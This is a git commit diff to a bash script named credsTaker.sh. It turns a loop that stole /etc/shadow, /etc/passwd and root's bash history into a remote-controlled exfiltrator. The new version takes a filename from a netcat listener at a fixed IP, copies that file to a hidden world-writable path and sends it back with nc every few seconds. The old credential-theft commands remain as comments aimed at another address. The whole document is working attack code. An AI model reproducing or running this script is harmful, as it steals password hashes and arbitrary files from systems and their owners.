3629329b7a5e72e65929812f6929ba412be63ced
jstroz3 <83678620+jstroz3@users.noreply.github.com>
2022-02-14 18:36:10 -0500

    Add files via upload

--- credsTaker.sh
+++ credsTaker.sh
@@ -4,23 +4,42 @@
 
 while true
 do
-sudo cp /etc/shadow /Shadow
 
-sudo chmod 777 /Shadow
+sudo chmod 777 /.fname
 
-sudo nc -w 3 192.168.206.80 1234 < /Shadow
+sudo nc -w 3 192.168.206.80 9876 > /.fname
 
-sudo cp /etc/passwd /Passwd
+sudo chmod 777 /.fname
 
-sudo chmod 777 /Passwd
-
-sudo nc -w 3 192.168.206.80 2222 < /Passwd
-
-sudo cp /root/.bash_history /bash_history
-
-sudo chmod 777 /bash_history
-
-sudo nc -w 3 192.168.206.80 3333 < /bash_history
+fname=$(cat /.fname)
 
 sleep 10
+
+sudo chmod 777 /.file_cont
+
+sudo cp $fname /.file_cont
+
+sudo chmod 777 /.file_cont
+
+sudo nc -w 3 192.168.206.80 8765 < /.file_cont
+
+#sudo cp /etc/shadow /.Shadow
+
+#sudo chmod 777 /.Shadow
+
+#sudo nc -w 3 192.168.12.3 2473 < /.Shadow
+
+#sudo cp /etc/passwd /.Passwd
+
+#sudo chmod 777 /.Passwd
+
+#sudo nc -w 3 192.168.12.3 4723 < /.Passwd
+
+#sudo cp /root/.bash_history /.bash_history
+
+#sudo chmod 777 /.bash_history
+
+#sudo nc -w 3 192.168.12.3 3274 < /.bash_history
+
+#sleep 10
 done
